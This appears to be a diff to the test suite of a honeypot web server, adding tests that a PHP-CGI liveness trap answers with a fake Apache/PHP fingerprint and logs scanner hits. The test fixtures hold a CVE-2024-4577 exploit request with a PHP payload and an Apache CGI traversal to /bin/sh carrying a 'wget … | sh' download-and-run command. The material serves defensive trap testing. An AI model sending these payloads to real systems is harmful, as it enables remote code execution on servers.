@@ -566,6 +566,7 @@ def test_all_trap_families_default_on():
     assert tbenv.DOCKER_DAEMON_ENABLED
     assert tbenv.NEXTJS_ENABLED
     assert tbenv.CMD_INJECTION_ENABLED
+    assert tbenv.PHP_CGI_LIVENESS_ENABLED
     assert tbenv.WEBAPP_FORM_ENABLED
     assert tbenv.OPENAPI_SWAGGER_ENABLED
     assert tbenv.DRUPAL_ENABLED
@@ -6748,6 +6749,124 @@ async def test_dispatch_apache_cgi_shell_body_logs_stdin_command(flux_client):
     assert entry["cmdSource"] == "body"
     assert entry["cmdKey"] == "stdin"
     assert "204.76.203.196" in entry["cmd"]
+
+
+# --- PHP-CGI bare-path liveness probe ---
+
+
+@pytest.mark.parametrize("path", [
+    "/cgi-bin/php",
+    "/cgi-bin/php-cgi",
+    "/cgi-bin/php.cgi",
+    "/cgi-bin/php5",
+    "/cgi-bin/php5-cgi",
+    "/cgi-bin/php5.cgi",
+    "/cgi-bin/php7",
+    "/cgi-bin/php7-cgi",
+    "/cgi-bin/php7.cgi",
+    "/cgi-bin/php8",
+    "/cgi-bin/php8-cgi",
+    "/cgi-bin/php8.cgi",
+    "/cgi-bin/",
+    "/cgi-bin",
+    "/CGI-BIN/PHP",  # case-insensitive
+])
+def test_php_cgi_liveness_path_matches(path):
+    assert tbenv.is_php_cgi_liveness_path(path), f"expected liveness match: {path}"
+
+
+@pytest.mark.parametrize("path", [
+    # Paths the exploit/cmd-injection handlers own — must not be
+    # claimed by the liveness handler so the existing trap chain
+    # keeps the priority it has today.
+    "/cgi-bin/printenv",
+    "/cgi-bin/test-cgi",
+    "/cgi-bin/luci/;stok=/locale",  # OpenWrt LuCI, unrelated CVE
+    "/cgi-bin/nas_sharing.cgi",     # D-Link NAS, unrelated CVE
+    "/cgi-bin/.%2e/.%2e/.%2e/bin/sh",  # Apache CGI traversal
+    "/cgi-bin/index.php",
+    "/cgi-bin/admin.php",
+    "/php",                          # not under /cgi-bin/
+    "/",
+])
+def test_php_cgi_liveness_path_does_not_match(path):
+    assert not tbenv.is_php_cgi_liveness_path(path), f"unexpected match: {path}"
+
+
+def test_php_cgi_liveness_disabled_returns_false(monkeypatch):
+    monkeypatch.setattr(tbenv, "PHP_CGI_LIVENESS_ENABLED", False)
+    assert not tbenv.is_php_cgi_liveness_path("/cgi-bin/php")
+
+
+async def test_dispatch_php_cgi_liveness_get_returns_apache_php_fingerprint(flux_client):
+    resp = await flux_client.get(
+        "/cgi-bin/php",
+        headers={"X-Forwarded-For": "203.0.113.93"},
+    )
+    assert resp.status == 200
+    body = await resp.read()
+    # Body matches what real Apache + PHP-CGI returns when invoked
+    # without arguments — scanners gate on this exact shape.
+    assert body == b"<br />\n<b>No input file specified.</b>\n"
+    # Windows + Apache + PHP fingerprint is the actual bait.
+    assert "PHP/" in resp.headers.get("Server", "")
+    assert "Win" in resp.headers.get("Server", "")
+    assert resp.headers.get("X-Powered-By", "").startswith("PHP/")
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "php-cgi-liveness"
+    assert entry["phpCgiLivenessPath"] == "/cgi-bin/php"
+    assert entry["phpCgiLivenessMethod"] == "GET"
+
+
+async def test_dispatch_php_cgi_liveness_bare_dir_also_traps(flux_client):
+    resp = await flux_client.get(
+        "/cgi-bin/",
+        headers={"X-Forwarded-For": "203.0.113.94"},
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "php-cgi-liveness"
+    assert entry["phpCgiLivenessPath"] == "/cgi-bin/"
+
+
+async def test_dispatch_php_cgi_liveness_does_not_shadow_existing_php_cgi_rce(flux_client):
+    """The CVE-2024-4577 exploit POST (auto_prepend_file=php://input
+    in query + PHP body) must still land in the body-RCE handler,
+    not the liveness handler — that's where the canary fires."""
+    payload = b'<?php echo(md5("Hello CVE-2024-4577")); ?>'
+    resp = await flux_client.post(
+        "/cgi-bin/php?%2D%64+allow_url_include%3Don+%2D%64+auto_prepend_file%3Dphp%3A%2F%2Finput",
+        data=payload,
+        headers={"X-Forwarded-For": "203.0.113.95"},
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "cmd-injection-php-cgi-rce"
+
+
+async def test_dispatch_php_cgi_liveness_does_not_shadow_existing_apache_cgi_shell(flux_client):
+    payload = b"(wget -qO- https://198.51.100.7/sh) | sh"
+    resp = await flux_client.post(
+        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+        data=payload,
+        headers={"X-Forwarded-For": "203.0.113.96"},
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"] == "cmd-injection-apache-cgi-shell"
+
+
+async def test_dispatch_php_cgi_liveness_does_not_shadow_existing_printenv(flux_client):
+    """/cgi-bin/printenv stays with cmd-injection (which mints the
+    Tracebit AWS canary in the printenv-shape env block) — the
+    liveness handler must not steal that path."""
+    resp = await flux_client.get(
+        "/cgi-bin/printenv",
+        headers={"X-Forwarded-For": "203.0.113.97"},
+    )
+    assert resp.status == 200
+    entry = _log_entries(flux_client.log_path)[-1]
+    assert entry["result"].startswith("cmd-injection")
 
 
 # --- wp-config suffix-variant expansion ---
